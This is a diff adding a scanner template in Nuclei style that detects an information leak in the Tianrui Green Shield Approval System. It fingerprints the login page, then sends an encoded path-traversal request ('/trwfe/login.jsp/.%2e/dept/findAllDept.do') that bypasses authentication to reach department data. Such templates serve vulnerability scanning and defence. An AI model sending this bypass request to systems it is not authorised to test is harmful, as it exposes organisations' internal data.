@@ -1,0 +1,46 @@
+id: poc-yaml-tipray-gsas-findalldept-do-info-leak
+info:
+  name: Tianrui Green Shield Approval System findAllDept.do Information Leak Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+  description: |
+    This template detects an information leakage vulnerability in the Tianrui Green Shield Approval System (findAllDept.do endpoint).
+
+http:
+  - method: GET
+    path:
+      - "/trwfe/login.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "天锐绿盾审批系统"
+
+  - method: GET
+    path:
+      - "/trwfe/login.jsp/.%2e/dept/findAllDept.do"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"parentId\":"
+          - "\"persistentState\":"
+      - type: word
+        part: body
+        words:
+          - "total"
+        negative: true
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
